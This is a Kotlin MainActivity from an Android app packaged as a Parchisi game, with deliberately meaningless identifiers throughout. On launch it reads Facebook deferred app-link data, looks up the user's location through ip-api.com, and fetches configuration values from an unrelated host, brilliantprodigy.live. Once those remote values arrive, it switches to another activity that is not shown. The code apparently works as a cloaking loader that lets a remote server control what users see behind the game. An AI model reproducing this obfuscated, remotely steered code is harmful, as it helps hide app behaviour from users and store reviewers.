package com.superking.parchisi.starr

import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import android.content.Context
import android.content.Intent
import com.superking.parchisi.starr.ldijdfs.Vdsetwysd.Companion.cijvxicv
import androidx.appcompat.app.AppCompatActivity
import com.superking.parchisi.starr.ldijdfs.Vdsetwysd.Companion.cxvok
import android.os.Bundle
import android.util.Log
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.superking.parchisi.starr.databinding.ActivityMainBinding
import com.superking.parchisi.starr.ldijdfs.Vdsetwysd.Companion.ibjjicv

import com.superking.parchisi.starr.ldijdfs.Vdsetwysd.Companion.plasdokodas


import com.superking.parchisi.starr.vcbfdf.Jshddwijd
import com.superking.parchisi.starr.vcbfdf.Zasodkwosidj
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import com.superking.parchisi.starr.ldijdfs.Vdsetwysd.Companion.pldsokasd
import kotlinx.coroutines.launch
import retrofit2.Retrofit


class MainActivity : AppCompatActivity() {
    private lateinit var oksadko: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        oksadko = ActivityMainBinding.inflate(layoutInflater)
        setContentView(oksadko.root)

        eijjisdako(this)

        val zokzxkxzosj = Executors.newSingleThreadScheduledExecutor()
        var owkdkwo: String? = Hawk.get(plasdokodas, null)
        var fdidfok: String? = Hawk.get(pldsokasd, null)
        zokzxkxzosj.scheduleAtFixedRate({
            if (owkdkwo != null && fdidfok != null) {
                zokzxkxzosj.shutdown()
                bovknkovo()
            } else {
                owkdkwo = Hawk.get(plasdokodas)
                fdidfok = Hawk.get(pldsokasd)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            figjiggf
        }
    }

    fun eijjisdako(biokvb: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            biokvb
        ) { dpellpds: AppLinkData? ->
            dpellpds?.let {
                val cxivj = dpellpds.targetUri.host.toString()
                Hawk.put(cxvok, cxivj)
            }
        }
    }

    private suspend fun goktokgkgr() {
        val ciuvjdus = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Jshddwijd::class.java)
        val obkvokv = ciuvjdus.asqpplqspl().body()?.wospsdokw
        Log.d("Data from API", obkvokv.toString())

        Hawk.put(plasdokodas, obkvokv)
    }

    private fun bovknkovo() {
        val rijjisd = Intent(this@MainActivity, Zasodkwosidj::class.java)
        startActivity(rijjisd)
        finish()
    }

    private suspend fun doeksdi() {
        val cvjixv = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://brilliantprodigy.live/")
            .build()
            .create(Jshddwijd::class.java)
        val sdokwk = cvjixv.fijfooksd().body()?.xijcokskoa.toString()
        val ovbk = cvjixv.fijfooksd().body()?.wokdw.toString()
        val rpokdsoji = cvjixv.fijfooksd().body()?.fopdosow.toString()


        Hawk.put(cijvxicv, sdokwk)
        Hawk.put(ibjjicv, ovbk)
        Hawk.put(pldsokasd, rpokdsoji)

    }

    private val figjiggf: Job = GlobalScope.launch (Dispatchers.IO){
        goktokgkgr()
        doeksdi()
    }


}